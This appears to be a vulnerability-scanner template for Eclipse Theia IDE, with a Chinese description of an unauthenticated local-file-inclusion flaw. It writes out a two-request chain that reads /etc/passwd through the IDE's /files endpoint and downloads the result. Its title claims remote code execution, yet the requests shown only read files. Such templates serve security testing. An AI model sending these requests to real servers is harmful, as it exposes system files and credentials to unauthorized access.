id: theia-lfi-to-rce

info:
  name: Eclipse Theia IDE - 本地文件包含 to 远程代码执行
  author: 0x_Akoko
  severity: critical
  description: Eclipse Theia IDE - 本地文件包含 to 远程代码执行 存在未授权访问漏洞。攻击者可借此读取服务器本地敏感文件、配置凭证或应用源码，为进一步入侵提供条件。
  reference:
    - https://theia-ide.org/
  metadata:
    verified: true
    max-request: 2
  tags: theia,ide,lfi,file-read,unauth,rce

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET /files/?uri=file:///etc/passwd HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /files/download/?id={{file_id}} HTTP/1.1
        Host: {{Hostname}}

    extractors:
      - type: json
        name: file_id
        part: body
        internal: true
        json:
          - '.id'

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 200
